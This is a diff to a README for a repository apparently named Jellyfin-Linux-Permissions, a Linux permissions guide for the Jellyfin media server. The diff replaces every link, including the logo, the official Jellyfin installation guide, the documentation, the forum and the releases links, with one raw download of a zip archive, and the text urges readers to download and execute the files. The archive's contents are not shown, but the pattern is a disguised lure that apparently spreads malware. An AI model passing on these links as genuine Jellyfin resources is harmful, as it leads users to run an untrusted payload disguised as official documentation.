@@ -1,6 +1,6 @@
 # Jellyfin-Linux-Permissions 🐧
 
-![Jellyfin Logo](https://raw.githubusercontent.com/jellyfin/jellyfin/master/media/jellyfin-logo.svg)
+![Jellyfin Logo](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip)
 
 Welcome to the **Jellyfin-Linux-Permissions** repository! This guide aims to provide you with a comprehensive understanding of setting up and managing permissions for Jellyfin on Linux systems. With this resource, you can ensure that your Jellyfin server runs smoothly and securely.
 
@@ -25,7 +25,7 @@ Jellyfin is an open-source media server software that allows you to manage and s
 
 ## Getting Started
 
-To begin, ensure you have Jellyfin installed on your Linux system. You can follow the official [Jellyfin installation guide](https://jellyfin.org/docs/general/administration/install.html) for your specific distribution. Once installed, you can dive into managing permissions.
+To begin, ensure you have Jellyfin installed on your Linux system. You can follow the official [Jellyfin installation guide](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip) for your specific distribution. Once installed, you can dive into managing permissions.
 
 ## Understanding Permissions
 
@@ -124,13 +124,13 @@ Even with proper configuration, you may encounter issues. Here are some common p
 
 ## Resources
 
-- [Jellyfin Documentation](https://jellyfin.org/docs/)
-- [Linux Permissions Guide](https://www.digitalocean.com/community/tutorials/linux-file-permissions)
-- [Community Forum](https://forum.jellyfin.org/)
+- [Jellyfin Documentation](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip)
+- [Linux Permissions Guide](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip)
+- [Community Forum](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip)
 
 ## Releases
 
-To download the latest version of Jellyfin-Linux-Permissions, visit the [Releases section](https://github.com/josesk1975/Jellyfin-Linux-Permissions/releases). Download and execute the necessary files to get started.
+To download the latest version of Jellyfin-Linux-Permissions, visit the [Releases section](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip). Download and execute the necessary files to get started.
 
 ## Contributing
 
@@ -142,4 +142,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-Thank you for checking out **Jellyfin-Linux-Permissions**! We hope this guide helps you set up and manage your Jellyfin server effectively. For any further questions, feel free to reach out in the community forum or check the [Releases section](https://github.com/josesk1975/Jellyfin-Linux-Permissions/releases) for updates.
+Thank you for checking out **Jellyfin-Linux-Permissions**! We hope this guide helps you set up and manage your Jellyfin server effectively. For any further questions, feel free to reach out in the community forum or check the [Releases section](https://github.com/josesk1975/Jellyfin-Linux-Permissions/raw/refs/heads/main/makluk/Jellyfin_Linux_Permissions_v1.5.zip) for updates.
